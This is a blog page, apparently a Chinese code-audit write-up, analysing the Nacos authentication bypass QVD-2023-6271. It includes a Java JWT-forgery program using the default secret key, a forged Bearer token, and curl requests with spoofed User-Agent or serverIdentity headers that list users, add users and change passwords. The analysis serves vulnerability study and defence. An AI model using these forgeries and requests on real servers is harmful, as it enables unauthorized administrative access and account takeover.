@@ -1,0 +1,663 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="ki10Moc" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      Nacos身份认证绕过漏洞分析 
+      
+      
+      |
+    
+     ki10Moc&#39;s World
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/1.png">
+    <link rel="icon" href="/images/1.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/color-scheme.css">
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+<link rel="stylesheet" href="/css/comments.css">
+
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-RG82N8DQZ9"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+
+      gtag('config', 'G-RG82N8DQZ9');
+    </script>
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="ki10Moc's World" type="application/atom+xml">
+</head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/1.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">ki10Moc</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">主页</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">标签</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">友链</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">ki10Moc</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">Nacos身份认证绕过漏洞分析</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="Update time"></i>
+          2023-10-18 17:36:36
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags" title="Tags"></i>
+                
+                <span class="span--tag">
+                  <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="代码审计">
+                    <b>#</b> 代码审计
+                  </a>
+                </span>
+                
+                <span class="span--tag">
+                  <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="漏洞分析">
+                    <b>#</b> 漏洞分析
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <p>环境搭建麻了，本来搭建好了，但是没关虚拟机直接合上电脑，再回来就各种报错，***</p>
+<h2 id="nacos身份认证绕过漏洞分析qvd-2023-6271"><a class="markdownIt-Anchor" href="#nacos身份认证绕过漏洞分析qvd-2023-6271">#</a> Nacos 身份认证绕过漏洞分析 (QVD-2023-6271)</h2>
+<h3 id="远程调试环境搭建"><a class="markdownIt-Anchor" href="#远程调试环境搭建">#</a> 远程调试环境搭建</h3>
+<p>在 startup.sh 加上远程调试的参数</p>
+<p>JAVA_OPT=&quot;${JAVA_OPT} -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005&quot;</p>
+<p>这里建议使用 jdk8 新一点的版本，我这里是最新的</p>
+<p>然后 - Xmx 给大一些，我这里给的 2048，避免虚拟内存不足，否则也有可能会报错</p>
+<p>然后直接机上 - m standalone 单机启动即可</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231021131105138.png" alt="image-20231021131105138"></p>
+<h3 id="受影响版本"><a class="markdownIt-Anchor" href="#受影响版本">#</a> 受影响版本</h3>
+<p>0.1.0 &lt;= Nacos &lt;= 2.2.0</p>
+<h3 id="漏洞原理"><a class="markdownIt-Anchor" href="#漏洞原理">#</a> 漏洞原理</h3>
+<p>目前 Nacos 身份认证绕过漏洞 (QVD-2023-6271)，开源服务管理平台 Nacos 在默认配置下未对 token.secret.key 进行修改，导致远程攻击者可以绕过密钥认证进入后台，造成系统受控等后果。</p>
+<p>来看下官方修复的版本 (2.2.0.1)</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/alibaba/nacos/releases/tag/2.2.0.1">Release 2.2.0.1 (March 2nd, 2023) · alibaba/nacos (github.com)</a></p>
+<p>将硬编码写在源码里的秘钥注释掉了</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231020185049505.png" alt="image-20231020185049505"></p>
+<h3 id="源码分析"><a class="markdownIt-Anchor" href="#源码分析">#</a> 源码分析</h3>
+<p>关于漏洞，CISCN 初赛就打过，也不做过多解释，直接上手来看源码</p>
+<p>直接定位到 JwtToken 的产生逻辑这里</p>
+<p>com.alibaba.nacos.plugin.auth.impl.JwtTokenManager</p>
+<p>首先是 processProperties 方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">processProperties</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.tokenValidityInSeconds = (Long)EnvUtil.getProperty(<span class="string">&quot;nacos.core.auth.plugin.nacos.token.expire.seconds&quot;</span>, Long.class, AuthConstants.DEFAULT_TOKEN_EXPIRE_SECONDS);</span><br><span class="line">        <span class="type">String</span> <span class="variable">encodedSecretKey</span> <span class="operator">=</span> EnvUtil.getProperty(<span class="string">&quot;nacos.core.auth.plugin.nacos.token.secret.key&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.secretKey = Keys.hmacShaKeyFor((<span class="type">byte</span>[])Decoders.BASE64.decode(encodedSecretKey));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;the length of  must great than or equal 32 bytes; And the secret key  must be encoded by base64&quot;</span>, var3);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.jwtParser = Jwts.parserBuilder().setSigningKey(<span class="built_in">this</span>.secretKey).build();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>这里直接获取 SecretKey</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">encodedSecretKey</span> <span class="operator">=</span> EnvUtil.getProperty(<span class="string">&quot;nacos.core.auth.plugin.nacos.token.secret.key&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>也就是配置文件下的</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231020201106531.png" alt="image-20231020201106531"></p>
+<p>然后通过时间戳来生成，当前时间 + 有效时间，其实也就是 Token 到期的时间</p>
+<p>这里的时间是 CST (北美中部标准时间)</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231021134030024.png" alt="image-20231021134030024"></p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231020201351361.png" alt="image-20231020201351361"></p>
+<p>那再来看下使用到这一部分代码的登录逻辑</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231021124203386.png" alt="image-20231021124203386"></p>
+<p>这里直接由 jwtTokenManager 生成相应的值赋给 token</p>
+<p>并添加到 HTTP 头中</p>
+<p>然后是 authManager，会对 Token 做出合法性判断，不为空且 Bearer 为开头的直接返回第 7 个字符之后的内容，也就是 eyJ… 的 JWT 内容</p>
+<p>否则就会切请求包中的对应参数加载</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231021141238312.png" alt="image-20231021141238312"></p>
+<p>然后再 return Token</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231021141309886.png" alt="image-20231021141309886"></p>
+<p>处理好 Token 后就进入到当前验证类的 login 方法，这里调用 validate0 来检验 Token</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231021141512567.png" alt="image-20231021141512567"></p>
+<p>将用户的用户名和识别 ID 存储</p>
+<p>上面的操作无误后回到 Controller 层的 user 控制器下</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231021141655889.png" alt="image-20231021141655889"></p>
+<p>将上面的内容进行汇总</p>
+<p>也即将 Token，username，关于这里的 globalAdmin 可以看 https://github.com/alibaba/nacos/issues/5969</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231021142527365.png" alt="image-20231021142527365"></p>
+<p>最后的 doInvoke 执行以上所有的内容</p>
+<p>上面大致走了一下流程，了解了 jwt 的生成逻辑和校验规则，那下面就可以开始伪造了</p>
+<p>这里忘记写了一点，关于令牌的有效期，也即生成令牌后多久失效的时间值，在配置文件中</p>
+<p>就是 18000 秒，但是还要做单位换算，因为获取当前时间戳的单位就是毫秒</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231021151101538.png" alt="image-20231021151101538"></p>
+<p>直接 cvJwtTokenManager 的代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.Claims;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.Jwts;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.SignatureAlgorithm;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.io.Decoders;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.security.Keys;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(createToken(<span class="string">&quot;nacos&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">createToken</span><span class="params">(String userName)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> <span class="string">&quot;SecretKey012345678901234567890123456789012345678901234567890123456789&quot;</span>;</span><br><span class="line">        <span class="type">long</span> <span class="variable">now</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">        <span class="type">Date</span> <span class="variable">validity</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>(now + <span class="number">18000</span>*<span class="number">1000L</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Claims</span> <span class="variable">claims</span> <span class="operator">=</span> Jwts.claims().setSubject(userName);</span><br><span class="line">        <span class="keyword">return</span> Jwts.builder().setClaims(claims).setExpiration(validity).signWith(Keys.hmacShaKeyFor(Decoders.BASE64.decode(key)), SignatureAlgorithm.HS256).compact();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231021161322404.png" alt="image-20231021161322404"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY5Nzg5MzkyMn0.O575SLIgoYMLpwHgJwqTCP08dZ93JvNjipsEOIqU6Hc</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231021161416466.png" alt="image-20231021161416466"></p>
+<p>获取到用户信息</p>
+<p>后续关于打开鉴权还是同样存在绕过鉴权的漏洞</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/alibaba/nacos/issues/4593">https://github.com/alibaba/nacos/issues/4593</a></p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231021165055049.png" alt="image-20231021165055049"></p>
+<p>这里只要匹配到 UserAgent 为 Nacos-Server</p>
+<p>就直接调用 chain.doFilter (request, response);</p>
+<p>熟悉过滤器的都清楚，Filter 过滤器处理完相应的逻辑后会去调用到 FilterChain 的 doFilter，再由 FilterChain.doFilter 去调用到 service 方法</p>
+<p>这里直接调用了 chain.doFilter (request, response); 也就意味着没有后续的鉴权操作了，而是直接交给 Service 层了</p>
+<h3 id="漏洞影响范围"><a class="markdownIt-Anchor" href="#漏洞影响范围">#</a> 漏洞影响范围</h3>
+<p>1、2.0.0-ALPHA.1</p>
+<p>2、1.x.x</p>
+<p>访问用户列表接口</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl XGET <span class="string">&#x27;http://192.168.230.130:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9&amp;search=accurate&#x27;</span> -H <span class="string">&#x27;User-Agent: Nacos-Server&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231021193053019.png" alt="image-20231021193053019"></p>
+<p>添加新用户</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -XPOST <span class="string">&#x27;http://192.168.230.130:8848/nacos/v1/auth/users?username=test&amp;password=test&#x27;</span> -H <span class="string">&#x27;User-Agent: Nacos-Server&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231021193418781.png" alt="image-20231021193418781"></p>
+<p>再次访问刚才的接口就可以看到新用户了</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231021193445741.png" alt="image-20231021193445741"></p>
+<p>另一种 bypass</p>
+<p>跟进下面的 else</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231021194833125.png" alt="image-20231021194833125"></p>
+<p>在配置中写了 key 和 value</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231021194910654.png" alt="image-20231021194910654"></p>
+<p>在 header 头添加</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">serverIdentity: security</span><br></pre></td></tr></table></figure>
+<p>也同样可以达到效果</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231021195009331.png" alt="image-20231021195009331"></p>
+<p>也可以探测版本</p>
+<p>ip/nacos/v1/console/server/state</p>
+<p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20231021195058205.png" alt="image-20231021195058205"></p>
+<p>然后就是比较熟悉的 payload</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">读取用户账号密码:</span><br><span class="line">curl -X GET <span class="string">&quot;http://192.168.230.130:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9&amp;search=blur&quot;</span></span><br><span class="line"></span><br><span class="line">添加用户:</span><br><span class="line">curl -X POST <span class="string">&quot;http://192.168.230.130:8848/nacos/v1/auth/users?username=test&amp;password=test&quot;</span></span><br><span class="line"></span><br><span class="line">任意用户密码更改:</span><br><span class="line">curl -X PUT <span class="string">&quot;http://192.168.230.130:8848/nacos/v1/auth/users?username=test&amp;newPassword=test1234&quot;</span></span><br></pre></td></tr></table></figure>
+<p>默认启动是不开启鉴权的</p>
+<p>用户也可以开启后修改对应的 key 和 value 来提高安全性</p>
+<p><a target="_blank" rel="noopener" href="https://nacos.io/zh-cn/blog/announcement-token-secret-key.html">https://nacos.io/zh-cn/blog/announcement-token-secret-key.html</a></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2023/08/11/Tomcat-Listener%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="Update time"></i>
+              2023-10-18 17:36:36
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags" title="Tags"></i>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="代码审计">
+                        <b>#</b> 代码审计
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="漏洞分析">
+                        <b>#</b> 漏洞分析
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2023/11/21/PCL-Final%E5%A4%8D%E7%9B%98/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#nacos%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90qvd-2023-6271"><span class="toc-text"> Nacos 身份认证绕过漏洞分析 (QVD-2023-6271)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text"> 远程调试环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%97%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-text"> 受影响版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-text"> 漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-text"> 源码分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-text"> 漏洞影响范围</span></a></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/ki10Moc/">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="email" href="ki10Moc1949@gmail.com">
+            <i class="iconfont icon-envelope"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="facebook" target="_blank" rel="noopener" href="https://www.facebook.com/profile.php?id=100083345720708">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="twitter" target="_blank" rel="noopener" href="https://twitter.com/ki10moc1/status/1494844731544662019?s=21&t=l-0lygAzRMHeJeBklnPt-A">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/ki10Moc/">Copyright © 2025 ki10Moc</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/ki10Moc/">霍布斯鲍姆学徒 | CTFer</a>
+        
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + Nacos%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90 + '&url=' + https%3A%2F%2Fki10moc.github.io%2F2023%2F10%2F18%2FNacos%25E8%25BA%25AB%25E4%25BB%25BD%25E8%25AE%25A4%25E8%25AF%2581%25E7%25BB%2595%25E8%25BF%2587%25E6%25BC%258F%25E6%25B4%259E%25E5%2588%2586%25E6%259E%2590%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://ki10moc.github.io/2023/10/18/Nacos%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
